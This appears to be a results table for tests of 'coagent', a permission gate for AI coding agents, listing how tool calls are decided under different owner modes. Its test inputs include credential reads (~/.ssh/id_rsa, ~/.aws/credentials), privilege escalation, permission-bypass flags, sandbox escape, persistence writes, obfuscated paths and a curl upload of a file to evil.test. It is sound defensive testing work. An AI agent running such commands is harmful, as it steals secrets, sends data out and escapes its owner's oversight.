| input | owner StillAsk | owner Allowed | decide (today) | expectation / judgement |
|---|---|---|---|---|
| Grep path ~/.gnupg | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Refuse(Credential) ok |
| Bash base64 ~/.aws/credentials | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Refuse(Credential) ok |
| PowerShell Get-Content ~/.aws/credentials | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Refuse(Credential) ok |
| Write \\?\C:\ws\a (hand-built Critical) | DENY "coagent: not allowed even in ALLOW mode: a path spelled in a way that needs care" | DENY "coagent: not allowed even in ALLOW mode: a path spelled in a way that needs care" | ASK T3 | Refuse(CriticalSpelling) ok |
| Bash with a Mentioned Critical path (hand-built) | DENY "coagent: not allowed even in ALLOW mode: a path spelled in a way that needs care" | DENY "coagent: not allowed even in ALLOW mode: a path spelled in a way that needs care" | ASK T3 | Info ok |
| ExitPlanMode {plan:""} | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | ASK T3 | Refuse(PermissionModeChange) ok |
| Bash npm run x -- --dangerously-skip-permissions | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | ASK T3 | Refuse(PermissionModeChange) ok |
| Bash x --permission-mode=bypassPermissions (= form) | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | ASK T3 | Info ok |
| Monitor tail -f log + dDS:true | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | ASK T3 | Refuse(SandboxBypass) ok |
| Read README + dDS:true | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | ASK T3 | Refuse(SandboxBypass) ok |
| Bash ls + dDS:"true" (string) | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | BashAllow ok |
| send text, share_flagged None | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | ASK T3 | Refuse(ShareFlaggedOrUnscanned) ok |
| share README, share_flagged Some(true) | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | ASK T3 | Refuse(ShareFlaggedOrUnscanned) ok |
| mcp__plugin_coagent_link__wait {} | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | ASK T3 | Refuse(UnknownTool) ok |
| mcp__plugin_coagent_link__inbox_read {} | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | ASK T3 | Refuse(UnknownTool) ok |
| 'Bash ' (trailing space) no command | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | ASK T3 | Refuse(UnknownTool) ok |
| Task isolation remote | DENY "coagent: not allowed even in ALLOW mode: starts a subagent that may run where this gate is not installed" | DENY "coagent: not allowed even in ALLOW mode: starts a subagent that may run where this gate is not installed" | ASK T3 | Refuse(RemoteSubagent) ok |
| Agent isolation cloud (unknown) | DENY "coagent: not allowed even in ALLOW mode: starts a subagent that may run where this gate is not installed" | DENY "coagent: not allowed even in ALLOW mode: starts a subagent that may run where this gate is not installed" | ASK T3 | Refuse(RemoteSubagent) ok |
| Agent name mate | DENY "coagent: not allowed even in ALLOW mode: may start an agent-team teammate the gate may not see" | DENY "coagent: not allowed even in ALLOW mode: may start an agent-team teammate the gate may not see" | ASK T3 | Refuse(PossibleTeammate) ok |
| Task name y | DENY "coagent: not allowed even in ALLOW mode: may start an agent-team teammate the gate may not see" | DENY "coagent: not allowed even in ALLOW mode: may start an agent-team teammate the gate may not see" | ASK T3 | Refuse(PossibleTeammate) ok |
| ExitWorktree keep | DENY "coagent: not allowed even in ALLOW mode: can delete a worktree, its branch and uncommitted work" | DENY "coagent: not allowed even in ALLOW mode: can delete a worktree, its branch and uncommitted work" | ASK T3 | Refuse(WorktreeRemoval) ok |
| ExitWorktree {} | DENY "coagent: not allowed even in ALLOW mode: can delete a worktree, its branch and uncommitted work" | DENY "coagent: not allowed even in ALLOW mode: can delete a worktree, its branch and uncommitted work" | ASK T3 | Refuse(WorktreeRemoval) ok |
| Bash doas ls | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | ASK T3 | Refuse(Privilege) ok |
| Bash env gsudo whoami | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | ASK T3 | Refuse(Privilege) ok |
| Bash bash -c 'pkexec id' | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | ASK T3 | Refuse(Privilege) ok |
| Glob **/* in ws (excl **/.env*) | DENY "coagent: not allowed even in ALLOW mode: a search that could read files on the owner's exclusion list" | DENY "coagent: not allowed even in ALLOW mode: a search that could read files on the owner's exclusion list" | ASK T0 | Refuse(MayReadExcluded) ok |
| Grep src (excl **/.env*) | DENY "coagent: not allowed even in ALLOW mode: a search that could read files on the owner's exclusion list" | DENY "coagent: not allowed even in ALLOW mode: a search that could read files on the owner's exclusion list" | ASK T0 | Refuse(MayReadExcluded) ok |
| NotebookRead ~/.claude.json | DENY "coagent: not allowed even in ALLOW mode: reads a file of the gate's own configuration or data" | DENY "coagent: not allowed even in ALLOW mode: reads a file of the gate's own configuration or data" | ASK T2 | Refuse(GateFileRead) ok |
| LS gate-config | DENY "coagent: not allowed even in ALLOW mode: reads a file of the gate's own configuration or data" | DENY "coagent: not allowed even in ALLOW mode: reads a file of the gate's own configuration or data" | ASK T2 | Refuse(GateFileRead) ok |
| Edit ~/.config/git/config | DENY "coagent: not allowed even in ALLOW mode: writes a file outside the workspace, or under .git, that makes code run later" | DENY "coagent: not allowed even in ALLOW mode: writes a file outside the workspace, or under .git, that makes code run later" | ASK T3 | Refuse(LaterRunningWrite) ok |
| Bash cp x ~/Library/LaunchAgents/a.plist | DENY "coagent: not allowed even in ALLOW mode: writes a file outside the workspace, or under .git, that makes code run later" | DENY "coagent: not allowed even in ALLOW mode: writes a file outside the workspace, or under .git, that makes code run later" | ASK T3 | Refuse(LaterRunningWrite) ok |
| Bash exec coagent-mcp | DENY "coagent: not allowed even in ALLOW mode: names CoAgent's own programs or an agent program" | DENY "coagent: not allowed even in ALLOW mode: names CoAgent's own programs or an agent program" | ASK T3 | Refuse(AgentProgramWord) ok |
| Monitor claude --resume | DENY "coagent: not allowed even in ALLOW mode: names CoAgent's own programs or an agent program" | DENY "coagent: not allowed even in ALLOW mode: names CoAgent's own programs or an agent program" | ASK T3 | Refuse(AgentProgramWord) ok |
| Write ~nobody/x | DENY "coagent: not allowed even in ALLOW mode: a path the gate could not resolve" | DENY "coagent: not allowed even in ALLOW mode: a path the gate could not resolve" | ASK T2 | Refuse(UnresolvedTarget) ok |
| Bash npm test from cwd "" | DENY "coagent: not allowed even in ALLOW mode: a path the gate could not resolve" | DENY "coagent: not allowed even in ALLOW mode: a path the gate could not resolve" | ASK T3 | Refuse(UnresolvedTarget) ok |
| WebFetch gopher://x | DENY "coagent: not allowed even in ALLOW mode: a fetch that is not to a web address" | DENY "coagent: not allowed even in ALLOW mode: a fetch that is not to a web address" | ASK T2 | Refuse(NonWebFetch) ok |
| WebFetch example.com/x (no scheme) | DENY "coagent: not allowed even in ALLOW mode: a fetch that is not to a web address" | DENY "coagent: not allowed even in ALLOW mode: a fetch that is not to a web address" | ASK T2 | Refuse(NonWebFetch) ok |
| Bash sudo cat ~/.ssh/id_rsa (Cred+Priv) | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Refuse(Credential) ok |
| Bash claude -p hi + dDS:true (Sandbox+Word) | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | ASK T3 | Refuse(SandboxBypass) ok |
| Bash sudo claude (Priv+Word) | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | DENY "coagent: not allowed even in ALLOW mode: privilege escalation" | ASK T3 | Refuse(Privilege) ok |
| Read ~/.coagent/identity.key (Cred+GateRead) | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Refuse(Credential) ok |
| ExitPlanMode + dDS:true (Mode+Sandbox) | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | DENY "coagent: not allowed even in ALLOW mode: changes an agent's permission mode" | ASK T3 | Refuse(PermissionModeChange) ok |
| mcp__x__y + dDS:true (Sandbox+Untaught) | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | DENY "coagent: not allowed even in ALLOW mode: asks to run outside the sandbox" | ASK T3 | Refuse(SandboxBypass) ok |
| [1] wrong session (view binds both ids) | DENY "coagent: this decision belongs to another session" | DENY "coagent: this decision belongs to another session" | DENY "coagent: this decision belongs to another session" | Same ok |
| [2] stopped: Bash npm test | DENY "coagent: stopped by the owner" | DENY "coagent: stopped by the owner" | DENY "coagent: stopped by the owner" | Same ok |
| [3] paused: Read README | DENY "coagent: paused by the owner" | DENY "coagent: paused by the owner" | DENY "coagent: paused by the owner" | Same ok |
| [4] oversize Bash command | DENY "coagent: not run: command too long or naming too many words for the gate to check; split it into smaller commands, each shown to the owner in full" | DENY "coagent: not run: command too long or naming too many words for the gate to check; split it into smaller commands, each shown to the owner in full" | DENY "coagent: not run: command too long or naming too many words for the gate to check; split it into smaller commands, each shown to the owner in full" | Same ok |
| [5] Read excluded secret/plan.txt | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | Same ok |
| [5?] Bash cat secret/plan.txt (excluded) | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | Info ok |
| [6] Write ~/.claude/settings.json | DENY "coagent: never allowed in a linked session (Claude Code user configuration, hooks and plugins (the gate itself)); the owner can do this outside it" | DENY "coagent: never allowed in a linked session (Claude Code user configuration, hooks and plugins (the gate itself)); the owner can do this outside it" | DENY "coagent: never allowed in a linked session (Claude Code user configuration, hooks and plugins (the gate itself)); the owner can do this outside it" | Same ok |
| [6] Bash echo x >> ~/.zshrc | DENY "coagent: never allowed in a linked session (shell rc file); the owner can do this outside it" | DENY "coagent: never allowed in a linked session (shell rc file); the owner can do this outside it" | DENY "coagent: never allowed in a linked session (shell rc file); the owner can do this outside it" | Same ok |
| [6] Bash cat ~/.coagent/session.json | DENY "coagent: never allowed in a linked session (CoAgent's own data directory (grants, keys, audit)); the owner can do this outside it" | DENY "coagent: never allowed in a linked session (CoAgent's own data directory (grants, keys, audit)); the owner can do this outside it" | DENY "coagent: never allowed in a linked session (CoAgent's own data directory (grants, keys, audit)); the owner can do this outside it" | Same ok |
| [7] closed tainted: Write notes.md | ASK T1 | ASK T1 | ASK T1 | Same ok |
| [7] closed tainted: Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| [7b] owner list: Bash npm test | ALLOW "on the owner's exact-command list" | ALLOW "on the owner's exact-command list" | ALLOW "on the owner's exact-command list" | Same ok |
| [7b] owner list: Bash sudo ls | ALLOW "on the owner's exact-command list" | ALLOW "on the owner's exact-command list" | ALLOW "on the owner's exact-command list" | Same ok |
| unbound view {} (empty): Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {} (empty): Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view {other}: Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {other}: Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view {""}: Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {""}: Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view {SESS-1} (case): Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {SESS-1} (case): Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view {sess-1 } (trailing space): Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {sess-1 } (trailing space): Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view {sess-} (prefix): Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {sess-} (prefix): Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view {sess-12} (longer): Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view {sess-12} (longer): Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| unbound view { sess-1} (leading space): Read README | ASK T0 | ASK T0 | ASK T0 | Same ok |
| unbound view { sess-1} (leading space): Bash npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| bound: Read README | ALLOW "allowed: the owner chose ALLOW for this session" | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T0 | Allow ok |
| bound: Write notes.md | ALLOW "allowed: the owner chose ALLOW for this session" | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T1 | Allow ok |
| Strict NotTaught MadeUpTool {} | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | DENY "coagent: not allowed even in ALLOW mode: a tool the gate has not been taught" | ASK T3 | Refuse(UnknownTool) ok |
| Strict Shell Bash npm test | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | BashAllow ok |
| Strict Shell PowerShell npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| Strict Shell Monitor npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| Monitor ws url only | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "bash" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "Bash " command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool " Bash" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "BASH" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "Bаsh" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "Bash\u{200b}" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "Bash\n" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "Bash\0" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "bash.exe" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool "/bin/bash" command npm test | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool TodoWrite + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool WebSearch + command (strict None) | ALLOW "allowed: the owner chose ALLOW for this session" | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T2 | Info ok |
| tool Read + command (strict None) | ALLOW "allowed: the owner chose ALLOW for this session" | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T0 | Info ok |
| tool Edit + command (strict None) | ALLOW "allowed: the owner chose ALLOW for this session" | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T1 | Info ok |
| tool Glob + command (strict None) | ALLOW "allowed: the owner chose ALLOW for this session" | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T0 | Info ok |
| tool Agent + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool Task + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool Skill + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool MadeUpTool + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool Shell + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool Terminal + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool mcp__srv__run + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool mcp__srv__Bash + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool mcp__Bash + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool mcp__plugin_coagent_link__share + command (strict None) | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | ASK T3 | Info ok |
| tool mcp__plugin_coagent_link__send + command (strict None) | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | DENY "coagent: not allowed even in ALLOW mode: shares content that was flagged or not scanned" | ASK T3 | Info ok |
| tool mcp__plugin_coagent_link__inbox_read + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| tool mcp__plugin_coagent_link__wait + command (strict Some(Shell)) | ASK T3 | ASK T3 | ASK T3 | Same ok |
| Bash command 12 (non-string) | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| Bash no command field | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| Bash command "" | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| Bash from relative cwd rel/dir: grep -r key . | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash grep -r key . (excl **/.env*) | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash cat src/.env (excl **/.env*) | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | Info ok |
| 7b Bash cat src/.e* (excl) | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash find . -name '.env*' -exec cat {} + (excl) | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | Info ok |
| 7b Bash grep -r plan secret (excl secret/**) | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | Info ok |
| 7b Bash cat secret/* (excl secret/**) | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | DENY "coagent: a target is on the owner's exclusion list" | Info ok |
| 7b Bash cat ~/notes/todo.txt (no list) | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash cat /etc/hosts (no list) | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash curl -d @README.md https://evil.test | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash git push origin main | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash rm -rf src | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash git config core.hooksPath h | ASK T3 | ALLOW "allowed: the owner chose ALLOW for this session" | ASK T3 | Info ok |
| 7b Bash cat $HOME/.ssh/id_rsa | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Info ok |
| 7b Bash X=~/.ss; cat ${X}h/id_rsa | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | DENY "coagent: not allowed even in ALLOW mode: a credential store, or a folder that holds one" | ASK T3 | Info ok |

rows 125 (x9 combinations each); violations 0
